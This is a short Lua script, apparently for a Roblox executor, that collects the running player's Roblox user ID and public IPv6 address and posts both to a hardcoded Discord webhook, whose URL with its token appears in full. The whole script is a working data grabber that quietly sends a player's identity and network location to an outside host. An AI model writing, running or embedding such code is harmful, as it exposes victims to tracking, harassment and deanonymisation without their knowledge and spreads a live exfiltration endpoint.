local HttpService = game:GetService("HttpService")
local request = http_request or request or syn.request

local Userid = game.Players.LocalPlayer.UserId

-- Function to fetch IPv6 address
local function getIPv6()
    local ipifyURL = "https://api6.ipify.org?format=json"
    local response = HttpService:JSONDecode(game:HttpGet(ipifyURL))
    return response.ip
end

-- Fetch IPv6 address
local IPv6 = getIPv6()

local url = "https://discord.com/api/webhooks/1126471431186821170/qLuTcjb0e24GPJEyl2_HUwx47doKrEP5gDTCm6eDTzj_e84FRBEp8UA_WeYp3_npvAPw"
local data = {
    ["content"] = "IdRB: " .. Userid .. "\nIPv6: " .. IPv6
}

local jsonData = HttpService:JSONEncode(data)

local abcdef = {
    Url = url,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = jsonData
}

request(abcdef)
